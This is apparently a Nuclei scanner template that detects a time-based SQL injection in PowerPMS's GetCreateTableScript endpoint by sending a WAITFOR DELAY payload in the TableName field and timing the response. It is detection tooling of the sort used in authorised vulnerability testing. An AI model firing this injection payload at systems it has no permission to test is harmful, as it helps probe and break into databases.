id: powerpms-getcreatetablescript-sqli
info:
  name: PowerPMS GetCreateTableScript SQL Injection Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection

variables:
  t1: "{{rand_int(4, 9)}}"
  t2: "{{to_number(t1) + 2}}"

http:
  - raw:
      - |
        POST /WebCenter/GetCreateTableScript HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        TableName=1';WAITFOR+DELAY+'0:0:{{t1}}'--

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "\"success\":false"
          - "message"
          - "msgList"
      - type: word
        part: body
        words:
          - "<"
        negative: true
      - type: dsl
        dsl:
          - "duration > to_number(t1)"
          - "duration < to_number(t2)"
